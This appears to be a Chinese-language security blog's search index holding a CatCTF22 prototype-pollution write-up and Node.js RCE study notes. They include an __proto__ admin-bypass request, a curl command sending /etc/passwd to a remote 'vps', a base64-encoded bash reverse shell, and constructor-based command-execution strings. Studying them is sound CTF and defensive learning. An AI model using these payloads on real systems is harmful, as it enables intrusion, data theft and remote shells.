<?xml version="1.0" encoding="utf-8"?>
<search> 
  
  
    
    <entry>
      <title>SycServer2_SCTF24</title>
      <link href="/2024/11/01/SycServer2_SCTF24/"/>
      <url>/2024/11/01/SycServer2_SCTF24/</url>
      
        <content type="html"><![CDATA[<h2 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h2><h2 id="源码"><a href="#源码" class="headerlink" title="源码"></a>源码</h2>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> recurrence </tag>
            
            <tag> rce </tag>
            
            <tag> proto pollution </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>wife_CatCTF22</title>
      <link href="/2024/11/01/wife_CatCTF22/"/>
      <url>/2024/11/01/wife_CatCTF22/</url>
      
        <content type="html"><![CDATA[<blockquote><p>黑盒原型链污染，原型链污染绕过身份验证</p></blockquote><h2 id="分析与尝试-DONE"><a href="#分析与尝试-DONE" class="headerlink" title="分析与尝试 DONE"></a>分析与尝试 DONE</h2><ol><li><p>注意到服务端使用node express框架，可以故意报错搞点信息，比如多谢一个段等</p></li><li><p>先看看node这边的漏洞试试，现在就是要登录为admin用户，猜测flag在admin中，有两个思路</p><ol><li>获取admin的账号与密码</li><li>node相关的可能是原型链污染？服务端<ol><li>admin直接登录，服务端一般会保存一个存有用户信息的对象，这里如果对于普通用户没有设置admin就可能通过原型链进行覆盖(直接clone的话)，如果有设置admin&#x3D;false那就不行 -&gt; 比2有可能，都试试，先这个，<strong>但是这里试试去掉isAdmin&#x3D;false是可以的</strong>，可以从第二种情况去到第一种情况</li><li>注册一个admin用户，这个code涉及到邀请码(不是验证码)的设计，考虑一般和数据库相关，原型链覆盖也无从下手 -&gt; 如果是对象的话在Object处进行覆盖是无法通过原型链访问到的，因为自己就有<strong>可能性不大</strong></li></ol></li></ol></li><li><p>确定先通过admin直接登录探测，下一步就是要找到键了，发现在注册中有一个isAdmin会不会在邀请码对的时候进行clone？试试，想要直接登录的话还是要先注册，普通注册+原型链污染</p></li><li><p>最终payload</p> <figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable constant_">POST</span> /register <span class="variable constant_">HTTP</span>/<span class="number">1.1</span></span><br><span class="line"><span class="comment">// ...</span></span><br><span class="line"></span><br><span class="line">&#123;</span><br><span class="line">    <span class="string">&quot;username&quot;</span>:<span class="string">&quot;h4ck3r&quot;</span>,</span><br><span class="line">    <span class="string">&quot;password&quot;</span>:<span class="string">&quot;aaa&quot;</span>,</span><br><span class="line">    <span class="string">&quot;__proto__&quot;</span>: &#123;<span class="string">&quot;isAdmin&quot;</span>:<span class="literal">true</span> &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li></ol><h2 id="题解白盒一下"><a href="#题解白盒一下" class="headerlink" title="题解白盒一下"></a>题解白盒一下</h2><ol><li><em><strong>注意点就是Object.assign()在JSON.parse()下存在原型链污染</strong></em></li><li>可以多多fuzz</li><li><a href="https://xia0ji233.pro/2023/01/01/Nepnep-CatCTF2022/">官方题解的源码</a></li></ol><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">app.<span class="title function_">post</span>(<span class="string">&#x27;/register&#x27;</span>, <span class="function">(<span class="params">req, res</span>) =&gt;</span> &#123;</span><br><span class="line">    <span class="keyword">let</span> user = <span class="title class_">JSON</span>.<span class="title function_">parse</span>(req.<span class="property">body</span>)</span><br><span class="line">    <span class="keyword">if</span> (!user.<span class="property">username</span> || !user.<span class="property">password</span>) &#123;</span><br><span class="line">        <span class="keyword">return</span> res.<span class="title function_">json</span>(&#123; <span class="attr">msg</span>: <span class="string">&#x27;empty username or password&#x27;</span>, <span class="attr">err</span>: <span class="literal">true</span> &#125;)</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (users.<span class="title function_">filter</span>(<span class="function"><span class="params">u</span> =&gt;</span> u.<span class="property">username</span> == user.<span class="property">username</span>).<span class="property">length</span>) &#123;</span><br><span class="line">        <span class="keyword">return</span> res.<span class="title function_">json</span>(&#123; <span class="attr">msg</span>: <span class="string">&#x27;username already exists&#x27;</span>, <span class="attr">err</span>: <span class="literal">true</span> &#125;)</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (user.<span class="property">isAdmin</span> &amp;&amp; user.<span class="property">inviteCode</span> != <span class="variable constant_">INVITE_CODE</span>) &#123;</span><br><span class="line">        user.<span class="property">isAdmin</span> = <span class="literal">false</span></span><br><span class="line">        <span class="keyword">return</span> res.<span class="title function_">json</span>(&#123; <span class="attr">msg</span>: <span class="string">&#x27;invalid invite code&#x27;</span>, <span class="attr">err</span>: <span class="literal">true</span> &#125;)</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">let</span> newUser = <span class="title class_">Object</span>.<span class="title function_">assign</span>(&#123;&#125;, baseUser, user)</span><br><span class="line">    users.<span class="title function_">push</span>(newUser)</span><br><span class="line">    res.<span class="title function_">json</span>(&#123; <span class="attr">msg</span>: <span class="string">&#x27;user created successfully&#x27;</span>, <span class="attr">err</span>: <span class="literal">false</span> &#125;)</span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> recurrence </tag>
            
            <tag> proto pollution </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Nodejs安全</title>
      <link href="/2024/10/30/Nodejs%E5%AE%89%E5%85%A8/"/>
      <url>/2024/10/30/Nodejs%E5%AE%89%E5%85%A8/</url>
      
        <content type="html"><![CDATA[<h2 id="Nodejs前置知识"><a href="#Nodejs前置知识" class="headerlink" title="Nodejs前置知识"></a>Nodejs前置知识</h2><h3 id="CJS-and-EJS"><a href="#CJS-and-EJS" class="headerlink" title="CJS and EJS"></a>CJS and EJS</h3><ol><li><p>CJS（CommonJS）模块和ES6（ECMAScript 2015）模块是JavaScript中两种不同的模块化系统，它们各自有不同的语法和加载机制</p><ol><li>兼容性: 不是所有环境都支持ES6模块，有时需要使用转码器如Babel将ES6代码转换成向后兼容的版本</li></ol></li><li><p>CJS</p><ol><li><strong>同步加载</strong>: 在Node.js环境中，CommonJS模块是同步加载的。这意味着，在执行当前文件代码之前，所有通过 require 加载的依赖都会被解析并执行</li><li>使用场景: 非常适合服务器端应用，因为服务器端通常不需要考虑加载时间的影响</li></ol><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 模块操作: require和exports</span></span><br><span class="line"><span class="comment">// 导出</span></span><br><span class="line"><span class="variable language_">module</span>.<span class="property">exports</span> = &#123;</span><br><span class="line">  <span class="attr">foo</span>: <span class="string">&#x27;bar&#x27;</span></span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 或者</span></span><br><span class="line"><span class="built_in">exports</span>.<span class="property">bar</span> = <span class="string">&#x27;baz&#x27;</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 引入</span></span><br><span class="line"><span class="keyword">const</span> myModule = <span class="built_in">require</span>(<span class="string">&#x27;./myModule&#x27;</span>);</span><br></pre></td></tr></table></figure></li><li><p>ES6</p><ol><li><strong>异步加载</strong>: 异步加载的</li><li><strong>静态</strong>: ES6模块的设计是静态的，即模块的依赖关系必须在编译时确定，这允许工具进行优化，如tree shaking等</li><li>使用场景: 适合现代Web应用，特别是单页应用程序（SPA），以及任何希望利用最新JavaScript特性的项目</li></ol><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// import和export</span></span><br><span class="line"><span class="comment">// 导出</span></span><br><span class="line"><span class="keyword">export</span> <span class="keyword">const</span> foo = <span class="string">&#x27;bar&#x27;</span>;</span><br><span class="line"><span class="keyword">export</span> <span class="keyword">function</span> <span class="title function_">baz</span>(<span class="params"></span>) &#123;&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 或者</span></span><br><span class="line"><span class="keyword">const</span> bar = <span class="string">&#x27;baz&#x27;</span>;</span><br><span class="line"><span class="keyword">const</span> <span class="title function_">qux</span> = (<span class="params"></span>) =&gt; &#123;&#125;;</span><br><span class="line"><span class="keyword">export</span> &#123; bar, qux &#125;;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 引入</span></span><br><span class="line"><span class="keyword">import</span> &#123; foo, baz &#125; <span class="keyword">from</span> <span class="string">&#x27;./myModule&#x27;</span>;</span><br><span class="line"><span class="keyword">import</span> * <span class="keyword">as</span> myModule <span class="keyword">from</span> <span class="string">&#x27;./myModule&#x27;</span>; <span class="comment">// 导入整个模块</span></span><br></pre></td></tr></table></figure></li><li><p><strong>分辨</strong></p><ol><li>CommonJS模块和ES6模块的不同可以体现在package.json的type字段，当type字段为空或者为”commonjs”时，当前目录下的.js脚本会解释成CommonJS模块，如果type字段为module,.js解释为ES模块</li></ol></li></ol><h3 id="module-in-CJS"><a href="#module-in-CJS" class="headerlink" title="module in CJS"></a>module in CJS</h3><ol><li><p><strong>什么是模块</strong>: 在Node.js中，模块是指一个文件或一组文件，其中定义了一组相关的函数、变量和对象，以便可以重复使用 -&gt; 每个文件都被视为一个模块，文件路径就是模块名</p></li><li><p><strong>使用模块</strong></p><ol><li><p><strong>加载</strong>: 使用require函数可以加载模块并访问其内容，<code>require()</code>: 这是一个全局函数，用来加载模块。当调用require时，Node.js会查找指定的模块并执行其代码，然后返回该模块的导出对象；</p><ol><li>返回值：<code>require()</code>函数返回<code>module.exports</code>对象</li><li>module.exports：这是一个对象，可以通过赋值给它来导出模块中的内容。<em>默认情况下它是一个空对象</em><ol><li>如果只需要导出一个函数、对象或其他值，可以直接将其赋值给 module.exports</li><li>如果需要导出多个函数或对象，可以将它们作为属性添加到 module.exports 对象中</li></ol></li></ol></li><li><p><strong>共享</strong>: 通过module.exports将模块内的成员共享出去，每个Node.js文件都有一个module变量，<code>module.exports</code>对象用于公开模块中的函数、对象或值，以便它们可以在其他模块中使用。代表当前模块 –&gt; 这里指定add是模块中的add函数这样</p><ol><li>当需要模块时，分配给module.exports的任何内容都可用。</li><li><strong>exports赋值问题</strong><ol><li><code>exports</code>: 是 module.exports 的一个引用， 当你向 exports 添加属性或方法时，你实际上是在修改 module.exports</li><li>如果直接给 exports 赋予一个新的值（比如另一个对象），那么此时 exports 就不再是 module.exports 的引用了，但是不影响 module.exports</li><li>要影响 module.exports 需要直接进行修改</li><li><strong>最佳实践</strong>: exports 应该用来添加属性或方法，而不是重新赋值整个对象。如果你需要替换整个 module.exports 对象，请直接使用 module.exports</li></ol></li></ol>  <figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// math.js</span></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">add</span>(<span class="params">a, b</span>) &#123;</span><br><span class="line">  <span class="keyword">return</span> a + b;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">function</span> <span class="title function_">subtract</span>(<span class="params">a, b</span>) &#123;</span><br><span class="line">  <span class="keyword">return</span> a - b;</span><br><span class="line">&#125;</span><br><span class="line">    <span class="comment">// 导出函数</span></span><br><span class="line"><span class="variable language_">module</span>.<span class="property">exports</span> = &#123;</span><br><span class="line">  <span class="attr">add</span>: add,</span><br><span class="line">  <span class="attr">subtract</span>: subtract</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="comment">// app.js</span></span><br><span class="line"><span class="keyword">const</span> math = <span class="built_in">require</span>(<span class="string">&#x27;./math&#x27;</span>); <span class="comment">// 加载本地模块</span></span><br><span class="line"></span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(math.<span class="title function_">add</span>(<span class="number">2</span>, <span class="number">3</span>)); <span class="comment">// 输出 5</span></span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(math.<span class="title function_">subtract</span>(<span class="number">5</span>, <span class="number">3</span>)); <span class="comment">// 输出 2</span></span><br></pre></td></tr></table></figure></li></ol></li><li><p><strong>缓存</strong>: 当加载模块时，它会被缓存以提高性能；对同一模块的后续require调用将返回缓存的实例，确保该模块仅执行一次</p></li><li><p><strong>module type</strong></p><ol><li>核心模块：这些是由Node.js提供的内置模块，可以直接被<code>require()</code>函数调用，无需安装</li><li>本地模块：这些是你自己创建的文件或者项目中的文件。你可以定义自己的功能并通过exports对象来暴露它们</li><li>第三方模块：这些是从npm (Node Package Manager) 安装的外部库。npm拥有世界上最大的软件注册表，包含了无数个开源包，几乎可以满足任何开发需求 –&gt; 用npm安装后再<code>require()</code></li></ol></li></ol><h2 id="Nodejs执行系统命令"><a href="#Nodejs执行系统命令" class="headerlink" title="Nodejs执行系统命令"></a>Nodejs执行系统命令</h2><h3 id="Inject-Point-载体≈代码执行"><a href="#Inject-Point-载体≈代码执行" class="headerlink" title="Inject Point(载体≈代码执行)"></a>Inject Point(载体≈代码执行)</h3><ol><li><code>eval(&#39;console.log(&quot;hello world&quot;)&#39;)</code>，类似php eval</li><li>各种类型的回调函数，与时间相关 -&gt; 在漏洞中体现为可控输入(注意原型链)<ol><li><code>Function(&quot;console.log(&#39;HelloWolrd&#39;)&quot;)()</code>类似php的create_function</li><li><code>setTimeout(some_function, 2000)</code></li><li><code>setInteval(some_function, 2000)</code></li></ol></li></ol><h3 id="child-process-内置-module"><a href="#child-process-内置-module" class="headerlink" title="child_process 内置 module"></a>child_process 内置 module</h3><ol><li><p>child_process模块提供了以类似于popen(3)的方式生成子进程的能力，但不完全相同</p></li><li><p>命令<code>console.log(require(&#39;child_process&#39;))</code>返回一下内容 -&gt; 返回的是一个带有很多方法的对象，可以用于执行命令</p> <figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">&#123;</span><br><span class="line">  <span class="attr">_forkChild</span>: [<span class="title class_">Function</span>: _forkChild],</span><br><span class="line">  <span class="title class_">ChildProcess</span>: [<span class="title class_">Function</span>: <span class="title class_">ChildProcess</span>],</span><br><span class="line">  <span class="attr">exec</span>: [<span class="title class_">Function</span>: exec],</span><br><span class="line">  <span class="attr">execFile</span>: [<span class="title class_">Function</span>: execFile],</span><br><span class="line">  <span class="attr">execFileSync</span>: [<span class="title class_">Function</span>: execFileSync],</span><br><span class="line">  <span class="attr">execSync</span>: [<span class="title class_">Function</span>: execSync],</span><br><span class="line">  <span class="attr">fork</span>: [<span class="title class_">Function</span>: fork],</span><br><span class="line">  <span class="attr">spawn</span>: [<span class="title class_">Function</span>: spawn],</span><br><span class="line">  <span class="attr">spawnSync</span>: [<span class="title class_">Function</span>: spawnSync]</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li></ol><h4 id="1-child-process-exec-command-options-callback"><a href="#1-child-process-exec-command-options-callback" class="headerlink" title="1. child_process.exec(command[, options][, callback])"></a>1. <code>child_process.exec(command[, options][, callback])</code></h4><ol><li><p><strong>不使用callback无法直接获取输出</strong>: 会立即打印出ChildProcess对象，但不会等待命令执行完毕。因此，你看到的是子进程启动时的状态，而不是命令执行的结果 –&gt; <strong>不过命令是会执行的</strong>，需要回显时考虑<code>require(&#39;child_process&#39;).exec(&#39;ls&#39;,(error,stdout,stderr)=&gt;&#123;console.log(stdout)&#125;)</code></p><ol><li>exec函数返回一个ChildProcess对象。这个对象代表了新创建的子进程，并提供了与该子进程交互的方法和属性</li></ol></li><li><p>一些常用的payload</p> <figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">require</span>(<span class="string">&#x27;child_process&#x27;</span>).<span class="title function_">exec</span>(<span class="string">&#x27;ls&#x27;</span>);</span><br><span class="line"><span class="built_in">require</span>(<span class="string">&#x27;child_process&#x27;</span>).<span class="title function_">exec</span>(<span class="string">&#x27;curl -F &quot;x=`cat /etc/passwd`&quot; http://vps&#x27;</span>);  <span class="comment">// curl传输文件，可以考虑重定向文件发出信息ls</span></span><br><span class="line"><span class="built_in">require</span>(<span class="string">&#x27;child_process&#x27;</span>).<span class="title function_">exec</span>(<span class="string">&#x27;echo YmFzaCAtaSA%2BJiAvZGV2L3RjcC8xMjcuMC4wLjEvMzMzMyAwPiYx|base64 -d|bash&#x27;</span>);</span><br></pre></td></tr></table></figure></li></ol><h4 id="2-child-process-execSync-command-options"><a href="#2-child-process-execSync-command-options" class="headerlink" title="2. child_process.execSync(command[, options])"></a>2. <code>child_process.execSync(command[, options])</code></h4><ol><li><strong>同步阻塞非异步</strong>: exec() 和 execSync() 函数可用于执行命令并返回其输出。exec() 是异步的，这意味着它在命令完成之前就返回，而 execSync() 是同步的，这意味着它在命令完成之前阻塞<ol><li>可以利用这个情况获取输出比如<code>ls</code>命令这些</li></ol></li><li>常见payload和1.中的一样</li></ol><h4 id="3-child-process-spawn-command-args-options"><a href="#3-child-process-spawn-command-args-options" class="headerlink" title="3. child_process.spawn(command[, args][, options])"></a>3. <code>child_process.spawn(command[, args][, options])</code></h4><ol><li><p><strong>child_process基础函数</strong>: child_process模块中所有函数都是基于spawn和spawnSync函数的来实现的，换句话来说，spawn和spawnSync函数的配置是最完全的，其它函数都是对其做了封装和修改</p></li><li><p><strong>实现子进程与父进程的通信</strong>: child_process.spawn()方法使用给定的command生成一个新进程，并在args中使用命令行参数 -&gt; 命令行参数不用放到command里了</p><ol><li>如果中间数据过多也会阻塞，详见api文档</li></ol> <figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> &#123;spawn&#125;  = <span class="built_in">require</span>(<span class="string">&#x27;child_process&#x27;</span>);</span><br><span class="line"><span class="keyword">const</span> fs = <span class="built_in">require</span>(<span class="string">&#x27;fs&#x27;</span>);</span><br><span class="line"><span class="keyword">const</span> spawnObj = <span class="title function_">spawn</span>(<span class="string">&#x27;ping&#x27;</span>, [<span class="string">&#x27;127.0.0.1&#x27;</span>], &#123;<span class="attr">encoding</span>: <span class="string">&#x27;utf-8&#x27;</span>&#125;);</span><br><span class="line">spawnObj.<span class="property">stdout</span>.<span class="title function_">on</span>(<span class="string">&#x27;data&#x27;</span>, <span class="keyword">function</span>(<span class="params">chunk</span>) &#123;</span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(chunk.<span class="title function_">toString</span>());</span><br><span class="line">&#125;);</span><br><span class="line">spawnObj.<span class="property">stderr</span>.<span class="title function_">on</span>(<span class="string">&#x27;data&#x27;</span>, <span class="function">(<span class="params">data</span>) =&gt;</span> &#123;</span><br><span class="line">  <span class="variable language_">console</span>.<span class="title function_">log</span>(data);</span><br><span class="line">&#125;);</span><br><span class="line">spawnObj.<span class="title function_">on</span>(<span class="string">&#x27;close&#x27;</span>, <span class="keyword">function</span>(<span class="params">code</span>) &#123;</span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&#x27;close code : &#x27;</span> + code);</span><br><span class="line">&#125;)</span><br><span class="line">spawnObj.<span class="title function_">on</span>(<span class="string">&#x27;exit&#x27;</span>, <span class="function">(<span class="params">code</span>) =&gt;</span> &#123;</span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&#x27;exit code : &#x27;</span> + code);</span><br><span class="line">    fs.<span class="title function_">close</span>(fd, <span class="keyword">function</span>(<span class="params">err</span>) &#123;</span><br><span class="line">        <span class="keyword">if</span>(err) &#123;</span><br><span class="line">            <span class="variable language_">console</span>.<span class="title function_">error</span>(err);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;);</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure></li><li><p>option中有一个shell</p><ol><li>如果启用了shell选项，请勿将未经处理的用户输入传递给此函数。任何包含 shell 元字符的输入都可用于触发任意命令执行</li><li><code>shell &lt;boolean&gt; | &lt;string&gt;</code>如果为true ，则在 shell 内运行command 。在 Unix 上使用’&#x2F;bin&#x2F;sh’ ，在 Windows 上使用process.env.ComSpec 。可以将不同的 shell 指定为字符串。请参阅Shell 要求和默认 Windows shell(在api文档中)。默认值： false （无 shell）</li></ol></li></ol><h4 id="4-child-process-spawnSync-command-args-options"><a href="#4-child-process-spawnSync-command-args-options" class="headerlink" title="4. child_process.spawnSync(command[, args][, options])"></a>4. <code>child_process.spawnSync(command[, args][, options])</code></h4><ol><li>和<code>child_process.execSync()</code>更相似一点<ol><li>区别<ol><li>execSync: 可以解析 shell 特性（如管道、重定向等），一次执行复杂命令</li><li>spawnSync:  直接执行指定的可执行文件，不通过 shell。因此，它不能解析 shell 特性，安全性更好 –&gt; <strong>指定shell字符时可以(chat一下就好)</strong></li></ol></li></ol></li></ol><h4 id="5-child-process-execFile-Sync-file-args-options-callback"><a href="#5-child-process-execFile-Sync-file-args-options-callback" class="headerlink" title="5. child_process.execFile[Sync](file[, args][, options][, callback])"></a>5. <code>child_process.execFile[Sync](file[, args][, options][, callback])</code></h4><ol><li>执行一个可执行文件，可以通过shell参数来执行命令<ol><li>默认不通过shell，这意味着你不能利用 shell 的功能，比如 I&#x2F;O 重定向和管道 –&gt; <code>execFile(&#39;/bin/ls&#39;, [&#39;-la&#39;])</code> 会直接调用 <code>/bin/ls</code> 并传递 <code>-la</code> 参数</li></ol></li><li><strong>要求</strong><ol><li><p>被执行的文件一定要有可执行权限，如果是类似.py类的特定语言的脚本，一定在开头指定解释器程序路径</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> &#123; execFile &#125; = <span class="built_in">require</span>(<span class="string">&#x27;child_process&#x27;</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 指定 Python 解释器的路径和脚本路径</span></span><br><span class="line"><span class="keyword">const</span> pythonPath = <span class="string">&#x27;/usr/bin/python3&#x27;</span>; <span class="comment">// 或者你系统中 Python 的实际路径</span></span><br><span class="line"><span class="keyword">const</span> scriptPath = <span class="string">&#x27;./script.py&#x27;</span>;</span><br><span class="line"><span class="keyword">const</span> args = [<span class="string">&#x27;arg1&#x27;</span>, <span class="string">&#x27;arg2&#x27;</span>];</span><br><span class="line"><span class="title function_">execFile</span>(pythonPath, [scriptPath, ...args], <span class="function">(<span class="params">error, stdout, stderr</span>) =&gt;</span> &#123;</span><br><span class="line">  <span class="keyword">if</span> (error) &#123;</span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">error</span>(<span class="string">`执行出错: <span class="subst">$&#123;error&#125;</span>`</span>);</span><br><span class="line">    <span class="keyword">return</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">`stdout: <span class="subst">$&#123;stdout&#125;</span>`</span>);</span><br><span class="line">  <span class="variable language_">console</span>.<span class="title function_">error</span>(<span class="string">`stderr: <span class="subst">$&#123;stderr&#125;</span>`</span>);</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure></li></ol></li></ol><h4 id="6-child-process-fork-modulePath-args-options"><a href="#6-child-process-fork-modulePath-args-options" class="headerlink" title="6. child_process.fork(modulePath[, args][, options])"></a>6. <code>child_process.fork(modulePath[, args][, options])</code></h4><ol><li><code>fork()</code> 函数可用于创建一个新的 Node.js 进程，该进程与父进程共享相同的内存空间。这意味着<strong>父进程和子进程可以相互通信并访问彼此的变量和函数</strong><ol><li>与child_process.spawn()类似，返回一个ChildProcess对象。返回的ChildProcess将有一个额外的内置通信通道，允许消息在父进程和子进程之间来回传递 –&gt; 详见api文档</li><li>派生的Node.js子进程独立于父进程，但两者之间建立的IPC通信通道除外。每个进程都有自己的内存和V8实例。由于需要额外的资源分配，不建议生成大量的子Node.js进程</li></ol></li><li><strong>无法执行任意命令</strong>: child_process.fork()不支持child_process.spawn()中可用的shell选项，如果设置该选项，则将被忽略</li></ol><h4 id="补充的外部module"><a href="#补充的外部module" class="headerlink" title="补充的外部module"></a>补充的外部module</h4><ol><li>shelljs module from npm</li><li>simple-git</li></ol><h2 id="RCE-Tricks"><a href="#RCE-Tricks" class="headerlink" title="*RCE Tricks"></a>*RCE Tricks</h2><h3 id="原型链constructor构造载体"><a href="#原型链constructor构造载体" class="headerlink" title="原型链constructor构造载体"></a>原型链constructor构造载体</h3><h4 id="IIFE和Function"><a href="#IIFE和Function" class="headerlink" title="IIFE和Function"></a>IIFE和Function</h4><ol><li>在js中所有函数对象都是通过Function构造函数创建的 –&gt; 函数对象的<code>func.__proto__.constructor==Function</code>(通过原型链直接<code>func.constructor也是</code>)</li><li><strong>利用思路</strong>: 使用Function()来实现任意函数，并且通过抬手可得的原始类型(与包装对象有自动转换机制，<strong>自动装箱和拆箱</strong>)获取Function，这里以<code>Number</code>为例子<ol><li>Number.prototype 是所有 Number 实例的原型</li><li>Number 本身是一个函数，它的原型是 <code>Function.prototype</code></li><li>通过<code>(1).constructor.constructor</code>访问到<code>Function</code>对象</li></ol></li><li><em><strong><code>Function</code>对象</strong></em><ol><li><a href="https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Global_Objects/Function">mdn Function</a></li><li><code>Function([arg1, arg2, ..., argN], functionBody)</code>可以构造<code>Function(&#39;a&#39;, &#39;b&#39;, &#39;return a + b;&#39;);</code></li></ol></li><li>*<strong>立即调用函数表达式IIFE</strong><ol><li><p>作用: 创建一个独立的作用域，以避免变量污染全局命名空间。IIFE 可以有效地封装变量和函数，使其对外部不可见</p></li><li><p>js两种调用形式</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">(<span class="keyword">function</span>(<span class="params"></span>) &#123;</span><br><span class="line">    <span class="comment">// 函数体</span></span><br><span class="line">&#125;)();</span><br><span class="line"></span><br><span class="line">(<span class="function">() =&gt;</span> &#123;</span><br><span class="line">    <span class="comment">// 函数体</span></span><br><span class="line">&#125;)();</span><br></pre></td></tr></table></figure></li></ol></li></ol><h4 id="constructor-payload"><a href="#constructor-payload" class="headerlink" title="constructor payload"></a>constructor payload</h4><ol><li>CJS版本<ol><li><code>(1).constructor.constructor(&quot;return require(&#39;child_process&#39;).execSync(&#39;whoami&#39;).toString();&quot;)();</code></li><li><code>(1).constructor.constructor(&#39;return require(&quot;child_process&quot;).execSync(`\x64\x69\x72`).toString();&#39;)();</code> –&gt; 当exec中为十六进制时，要把单引号’改成反引号&#96;这里是js模板字符串</li></ol></li><li>ES6版本<ol><li><a href="https://developer.mozilla.org/zh-CN/docs/Web/JavaScript/Guide/Modules#%E5%8A%A8%E6%80%81%E5%8A%A0%E8%BD%BD%E6%A8%A1%E5%9D%97">mdn 动态加载模块</a></li><li><code>(1).constructor.constructor(&quot;return import(&#39;child_process&#39;).then(cp=&gt;&#123;cp.exec(&#39;cat /flag&#39;);&#125;);&quot;)();</code></li></ol></li><li>实际操作可以写一个探测脚本，现在没必要</li></ol><h3 id="global-process-mainModule-constructor-load"><a href="#global-process-mainModule-constructor-load" class="headerlink" title="global.process.mainModule.constructor._load"></a>global.process.mainModule.constructor._load</h3><h2 id="Ref"><a href="#Ref" class="headerlink" title="Ref"></a>Ref</h2><ol><li>nodejs基础<ol><li><a 